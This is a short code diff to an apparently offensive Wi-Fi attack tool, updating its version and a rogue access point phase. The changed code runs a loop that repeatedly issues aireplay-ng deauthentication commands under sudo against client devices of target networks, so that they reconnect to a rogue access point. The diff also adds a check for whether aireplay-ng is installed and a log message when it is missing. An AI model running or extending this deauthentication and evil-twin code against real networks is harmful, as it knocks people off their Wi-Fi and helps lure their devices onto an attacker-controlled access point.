@@ -53,7 +53,7 @@ import struct
 import threading
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-VERSION = "1.7.5"
+VERSION = "1.7.6"
 
 
 def _clients_base() -> Path:
@@ -2933,17 +2933,20 @@ def phase_rogue_ap(monitor_iface: str, primary_iface: str, target_aps: list,
 
         # Periodic deauth to force client reconnection to rogue AP
         deauth_t = None
-        if deauth_cl:
+        has_aireplay = shutil.which("aireplay-ng") is not None
+        if deauth_cl and has_aireplay:
             def _deauth_loop():
                 while not stop_portal.is_set():
                     for ap in aps:
                         for cl in (ap.get("clients") or []):
-                            _run(["aireplay-ng", "--deauth", "3",
+                            _run(["sudo", "aireplay-ng", "--deauth", "3",
                                   "-a", ap["bssid"], "-c", cl["mac"],
                                   monitor_iface], timeout=10)
                     time.sleep(15)
             deauth_t = threading.Thread(target=_deauth_loop, daemon=True)
             deauth_t.start()
+        elif deauth_cl and not has_aireplay:
+            log("Phase 6: deauth_clients enabled but aireplay-ng not found — skipping deauth")
 
         deadline = time.time() + duration
         while time.time() < deadline:
